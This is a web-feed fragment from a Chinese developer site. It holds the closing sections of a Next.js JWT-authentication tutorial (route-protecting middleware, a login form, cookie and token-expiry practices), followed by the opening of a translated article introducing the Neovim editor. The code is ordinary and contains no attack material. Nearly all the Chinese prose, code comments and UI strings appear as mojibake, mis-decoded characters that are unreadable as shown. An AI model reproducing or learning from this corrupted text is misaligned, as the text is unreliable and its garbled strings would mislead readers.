      <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    }

    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Component</span> {<span class="hljs-attr">...props</span>} /&gt;</span></span>
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ProtectedPage</span> = <span class="hljs-title function_">withAuth</span>(<span class="hljs-title class_">ChatPage</span>)
</code></pre>
<h4 data-id="heading-19">6.3 ä¸­é—´ä»¶ä¿æŠ¤ï¼ˆNext.js 13+ï¼‰</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// middleware.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/server'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">NextRequest</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/server'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">request: NextRequest</span>) {
  <span class="hljs-keyword">const</span> token = request.<span class="hljs-property">cookies</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'access_token'</span>)?.<span class="hljs-property">value</span>

  <span class="hljs-comment">// ä¿æŠ¤çš„è·¯ç”±</span>
  <span class="hljs-keyword">const</span> protectedPaths = [<span class="hljs-string">'/chat'</span>, <span class="hljs-string">'/profile'</span>, <span class="hljs-string">'/settings'</span>]
  <span class="hljs-keyword">const</span> isProtectedPath = protectedPaths.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">path</span> =&gt;</span>
    request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(path)
  )

  <span class="hljs-keyword">if</span> (isProtectedPath &amp;&amp; !token) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'/login'</span>, request.<span class="hljs-property">url</span>))
  }

  <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>()
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = {
  <span class="hljs-attr">matcher</span>: [<span class="hljs-string">'/chat/:path*'</span>, <span class="hljs-string">'/profile/:path*'</span>, <span class="hljs-string">'/settings/:path*'</span>]
}
</code></pre>
<hr/>
<h3 data-id="heading-20">ä¸ƒã€ç™»å½•é¡µé¢å®ç°</h3>
<h4 data-id="heading-21">7.1 ç™»å½•è¡¨å•</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// app/login/page.tsx</span>
<span class="hljs-string">'use client'</span>

<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/navigation'</span>
<span class="hljs-keyword">import</span> { useAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/hooks/useAuth'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">LoginPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()
  <span class="hljs-keyword">const</span> { login } = <span class="hljs-title function_">useAuth</span>()
  <span class="hljs-keyword">const</span> [username, setUsername] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>)
  <span class="hljs-keyword">const</span> [password, setPassword] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>)
  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>)
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>)

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">e: React.FormEvent</span>) =&gt; {
    e.<span class="hljs-title function_">preventDefault</span>()
    <span class="hljs-title function_">setError</span>(<span class="hljs-string">''</span>)
    <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>)

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">login</span>({ username, password })
      <span class="hljs-comment">// ç™»å½•æˆåŠŸï¼ŒuseAuthä¼šè‡ªåŠ¨è·³è½¬</span>
    } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">err</span>: <span class="hljs-built_in">any</span>) {
      <span class="hljs-title function_">setError</span>(err.<span class="hljs-property">response</span>?.<span class="hljs-property">data</span>?.<span class="hljs-property">msg</span> || <span class="hljs-string">'ç™»å½•å¤±è´¥'</span>)
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>)
    }
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"min-h-screen flex items-center justify-center bg-gray-50"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"max-w-md w-full space-y-8 p-8 bg-white rounded-lg shadow"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-3xl font-bold text-center text-gray-900"</span>&gt;</span>
            ç™»å½•
          <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{handleSubmit}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"space-y-6"</span>&gt;</span>
          {error &amp;&amp; (
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded"</span>&gt;</span>
              {error}
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          )}

          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"block text-sm font-medium text-gray-700"</span>&gt;</span>
              ç”¨æˆ·å
            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
              <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>
              <span class="hljs-attr">value</span>=<span class="hljs-string">{username}</span>
              <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setUsername(e.target.value)}
              required
              className="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500"
            /&gt;
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"block text-sm font-medium text-gray-700"</span>&gt;</span>
              å¯†ç 
            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
              <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span>
              <span class="hljs-attr">value</span>=<span class="hljs-string">{password}</span>
              <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setPassword(e.target.value)}
              required
              className="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500"
            /&gt;
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

          <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
            <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>
            <span class="hljs-attr">disabled</span>=<span class="hljs-string">{loading}</span>
            <span class="hljs-attr">className</span>=<span class="hljs-string">"w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50"</span>
          &gt;</span>
            {loading ? 'ç™»å½•ä¸­...' : 'ç™»å½•'}
          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-center"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/register"</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-sm text-blue-600 hover:text-blue-500"</span>&gt;</span>
            è¿˜æ²¡æœ‰è´¦å·ï¼Ÿç«‹å³æ³¨å†Œ
          <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<hr/>
<h3 data-id="heading-22">å…«ã€å®‰å…¨æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-23">8.1 XSSé˜²æŠ¤</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸è¦åœ¨localStorageä¸­å­˜å‚¨æ•æ„Ÿä¿¡æ¯</span>
<span class="hljs-comment">// âŒ ä¸å¥½</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'user_password'</span>, password)

<span class="hljs-comment">// âœ… å¥½</span>
<span class="hljs-comment">// åªå­˜å‚¨Tokenï¼Œä¸å­˜å‚¨å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯</span>
</code></pre>
<h4 data-id="heading-24">8.2 CSRFé˜²æŠ¤</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä½¿ç”¨httpOnly Cookieå­˜å‚¨Refresh Token</span>
<span class="hljs-comment">// æœåŠ¡ç«¯è®¾ç½®</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'refresh_token'</span>, refreshToken, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,  <span class="hljs-comment">// é˜²æ­¢JavaScriptè®¿é—®</span>
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// åªåœ¨HTTPSä¸‹ä¼ è¾“</span>
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>,  <span class="hljs-comment">// é˜²æ­¢CSRF</span>
  <span class="hljs-attr">maxAge</span>: <span class="hljs-number">7</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>  <span class="hljs-comment">// 7å¤©</span>
})
</code></pre>
<h4 data-id="heading-25">8.3 Tokenè¿‡æœŸå¤„ç†</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šæœŸæ£€æŸ¥Tokenæ˜¯å¦å³å°†è¿‡æœŸ</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkTokenExpiry</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> token = <span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">getAccessToken</span>()
    <span class="hljs-keyword">if</span> (!token) <span class="hljs-keyword">return</span>

    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">TokenManager</span>.<span class="hljs-title function_">isTokenExpired</span>(token)) {
      <span class="hljs-comment">// Tokenå·²è¿‡æœŸï¼Œå°è¯•åˆ·æ–°</span>
      authService.<span class="hljs-title function_">refreshToken</span>().<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-comment">// åˆ·æ–°å¤±è´¥ï¼Œè·³è½¬ç™»å½•</span>
        router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/login'</span>)
      })
    }
  }

  <span class="hljs-comment">// æ¯åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡</span>
  <span class="hljs-keyword">const</span> interval = <span class="hljs-built_in">setInterval</span>(checkTokenExpiry, <span class="hljs-number">60000</span>)
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(interval)
}, [])
</code></pre>
<hr/>
<h3 data-id="heading-26">ä¹ã€æ€»ç»“</h3>
<p>JWTè®¤è¯çš„æ ¸å¿ƒè¦ç‚¹ï¼š</p>
<p>âœ… <strong>åŒTokenæœºåˆ¶</strong> - Access + Refresh Token<br/>
âœ… <strong>è‡ªåŠ¨åˆ·æ–°</strong> - æ‹¦æˆªå™¨è‡ªåŠ¨å¤„ç†è¿‡æœŸ<br/>
âœ… <strong>è·¯ç”±ä¿æŠ¤</strong> - æœªè®¤è¯è‡ªåŠ¨è·³è½¬<br/>
âœ… <strong>å®‰å…¨å­˜å‚¨</strong> - httpOnly Cookie + localStorage<br/>
âœ… <strong>é”™è¯¯å¤„ç†</strong> - ä¼˜é›…å¤„ç†è®¤è¯å¤±è´¥</p>
<p><strong>ä¸‹ä¸€ç¯‡é¢„å‘Šï¼š</strong> ã€ŠFastAPIå¼‚æ­¥ç¼–ç¨‹ï¼šé«˜æ€§èƒ½APIæœåŠ¡çš„ç§˜å¯†ã€‹</p>
<hr/>
<p><strong>ä½œè€…ç®€ä»‹ï¼š</strong> èµ„æ·±å¼€å‘è€…ï¼Œåˆ›ä¸šè€…ã€‚ä¸“æ³¨äºè§†é¢‘é€šè®¯æŠ€æœ¯é¢†åŸŸã€‚å›½å†…é¦–æœ¬Flutterè‘—ä½œã€ŠFlutteræŠ€æœ¯å…¥é—¨ä¸å®æˆ˜ã€‹ä½œè€…,å¦è‘—æœ‰ã€ŠDartè¯­è¨€å®æˆ˜ã€‹åŠã€ŠWebRTCéŸ³è§†é¢‘å¼€å‘ã€‹ç­‰ä¹¦ç±ã€‚å¤šå¹´ä»äº‹è§†é¢‘ä¼šè®®ã€è¿œç¨‹æ•™è‚²ç­‰æŠ€æœ¯ç ”å‘ï¼Œå¯¹äºAndroidã€iOSä»¥åŠè·¨å¹³å°å¼€å‘æŠ€æœ¯æœ‰æ¯”è¾ƒæ·±å…¥çš„ç ”ç©¶å’Œåº”ç”¨ï¼Œä½œä¸ºä¸»è¦ç¨‹åºå‘˜å¼€å‘äº†å¤šä¸ªåº”ç”¨é¡¹ç›®ï¼Œæ¶‰åŠåŒ»ç–—ã€äº¤é€šã€é“¶è¡Œç­‰é¢†åŸŸã€‚</p>
<p><strong>å­¦ä¹ èµ„æ–™ï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkangshaojun%2Fai-agent-framework" target="_blank" title="https://github.com/kangshaojun/ai-agent-framework" ref="nofollow noopener noreferrer">é¡¹ç›®åœ°å€</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkangshaojun" target="_blank" title="https://github.com/kangshaojun" ref="nofollow noopener noreferrer">ä½œè€…GitHub</a></li>
</ul>
<p><strong>æ¬¢è¿äº¤æµï¼š</strong> å¦‚æœ‰é—®é¢˜æ¬¢è¿åœ¨è¯„è®ºåŒºè®¨è®º ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Neovimï¼Œä¼šæ˜¯ä½ çš„ä¸‹ä¸€æ¬¾â€œçœŸé¦™â€å¼€å‘ç¥å™¨å—ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7590104561474912308</link>    <guid>https://juejin.cn/post/7590104561474912308</guid>    <pubDate>2026-01-02T03:48:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590104561474912308" data-draft-id="7589935326782816290" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Neovimï¼Œä¼šæ˜¯ä½ çš„ä¸‹ä¸€æ¬¾â€œçœŸé¦™â€å¼€å‘ç¥å™¨å—ï¼Ÿ"/> <meta itemprop="keywords" content="Linux,Go,Python"/> <meta itemprop="datePublished" content="2026-01-02T03:48:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº‘äº‘ä¼—ç”Ÿs"/> <meta itemprop="url" content="https://juejin.cn/user/380845430158739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Neovimï¼Œä¼šæ˜¯ä½ çš„ä¸‹ä¸€æ¬¾â€œçœŸé¦™â€å¼€å‘ç¥å™¨å—ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/380845430158739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº‘äº‘ä¼—ç”Ÿs
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T03:48:20.000Z" title="Fri Jan 02 2026 03:48:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Neovimæ˜¯Vimåˆ†æ”¯ï¼ŒåŠŸèƒ½å¼ºå¤§ã€é«˜åº¦å¯é…ç½®ï¼Œæä¾›æ›´å¥½æ’ä»¶æ”¯æŒå’Œç°ä»£UIã€‚å®‰è£…åéœ€é…ç½®init.vimï¼Œå¯å€ŸKickstarterç®€åŒ–ã€‚å†…ç½®æ•™ç¨‹æ˜¯å­¦ä¹ å…³é”®ã€‚</p>
<blockquote>
<p>è¯‘è‡ªï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fis-neovim-your-next-favorite-development-tool%2F" target="_blank" title="https://thenewstack.io/is-neovim-your-next-favorite-development-tool/" ref="nofollow noopener noreferrer">Is Neovim Your Next Favorite Development Tool?</a></p>
<p>ä½œè€…ï¼šJack Wallen</p>
</blockquote>
<p>å¦‚æœä½ ä½¿ç”¨è¿‡ Linuxï¼Œä½ å¯èƒ½å¬è¯´è¿‡ <a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fvim-after-bram-a-core-maintainer-on-how-theyve-kept-it-going%2F" target="_blank" title="https://thenewstack.io/vim-after-bram-a-core-maintainer-on-how-theyve-kept-it-going/" ref="nofollow noopener noreferrer">Vim</a>ã€‚</p>
<p>åˆ«æ€¥ç€è·‘ã€‚</p>
<p>æ˜¯çš„ï¼ŒVim ç»ä¸æ˜¯ä¸–ç•Œä¸Šæœ€ç®€å•çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œä½†å®ƒæ˜¯åŠŸèƒ½æœ€å¼ºå¤§çš„ç¼–è¾‘å™¨ä¹‹ä¸€ã€‚Vim ä¸ä»…ä»…æ˜¯ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨ï¼›å®ƒæ˜¯ä¸€ä¸ªé«˜åº¦å¯é…ç½®ä¸”åŠŸèƒ½å¼ºå¤§çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fa-look-at-vim-a-text-editor-for-the-ages%2F" target="_blank" title="https://thenewstack.io/a-look-at-vim-a-text-editor-for-the-ages/" ref="nofollow noopener noreferrer">æ–‡æœ¬ç¼–è¾‘å™¨</a>ï¼Œå› å…¶ä½œä¸ºå‘½ä»¤è¡Œä¸­é«˜æ•ˆçš„ç¼–ç å·¥å…·è€Œå—åˆ°ç¨‹åºå‘˜çš„æ¬¢è¿ã€‚</p>
<p>Vim å…è®¸ç”¨æˆ·é€šè¿‡é”®ç›˜å¿«æ·é”®å‘å‡ºå¤æ‚çš„å‘½ä»¤ï¼Œè¿™æ ·ä½ çš„æ‰‹æŒ‡å°±æ°¸è¿œä¸å¿…ç¦»å¼€é”®ç›˜ã€‚Vim è¿˜å¯ä»¥é€šè¿‡æ’ä»¶æ‰©å±•ä»¥æ·»åŠ  <a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fbest-open-source-ides%2F" target="_blank" title="https://thenewstack.io/best-open-source-ides/" ref="nofollow noopener noreferrer">IDE</a> åŠŸèƒ½ã€‚</p>
<p>ä½†<a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fneovims-future-could-have-ai-and-brain-computer-interfaces%2F" target="_blank" title="https://thenewstack.io/neovims-future-could-have-ai-and-brain-computer-interfaces/" ref="nofollow noopener noreferrer">Neovim</a> åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>Neovim æ˜¯ Vim çš„ä¸€ä¸ªå¯æ‰©å±•åˆ†æ”¯ï¼Œæ—¨åœ¨ç®€åŒ–åº”ç”¨ç¨‹åºç®¡ç†ã€æé«˜å¯ç”¨æ€§ã€æä¾›æ›´å¥½çš„æ’ä»¶æ”¯æŒï¼Œå¹¶åŒ…æ‹¬å†…ç½®çš„è¯­è¨€æœåŠ¡å™¨åè®® (<a href="https://link.juejin.cn?target=https%3A%2F%2Fmicrosoft.github.io%2Flanguage-server-protocol%2F" target="_blank" title="https://microsoft.github.io/language-server-protocol/" ref="nofollow noopener noreferrer">LSP</a>) ä»¥åŠå¯¹ç°ä»£ GUI å’Œ UI çš„æ”¯æŒã€‚Neovim ä¿æŒäº†ä¸ Vim çš„æ ¸å¿ƒå…¼å®¹æ€§ï¼Œä½†æä¾›äº†æ›´åŠ ç²¾ç®€çš„ä½“éªŒã€‚</p>
<p>å¦‚æœä»ç»ˆç«¯åº”ç”¨å’Œå‘½ä»¤è¡Œè¿›è¡Œå¼€å‘çš„æƒ³æ³•å¾ˆåˆä½ çš„èƒƒå£ï¼Œé‚£ä¹ˆ Neovim å¯èƒ½æ˜¯é€‚åˆä½ çš„å·¥å…·ã€‚</p>
<p>Neovim åŒ…å«ä»¥ä¸‹åŠŸèƒ½ï¼š</p>
<ul>
<li>æ¯” Vim æ›´å¥½çš„é»˜è®¤è®¾ç½®ã€‚</li>
<li>ä¸€ä¸ªç”¨äºæ’ä»¶çš„æ—¶å°š APIã€‚</li>
<li>ä¸“æ³¨äºå¼€ç®±å³ç”¨çš„å¯ç”¨æ€§ã€‚</li>
<li>ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fhow-roblox-makes-programming-beginner-friendly-with-luau%2F" target="_blank" title="https://thenewstack.io/how-roblox-makes-programming-beginner-friendly-with-luau/" ref="nofollow noopener noreferrer">Lua</a> APIï¼Œä»¥åŠå°†é…ç½®åˆ†è§£ä¸ºæ¨¡å—çš„èƒ½åŠ›ï¼Œä½¿å¤æ‚çš„è®¾ç½®æ›´æ˜“äºç®¡ç†ã€‚</li>
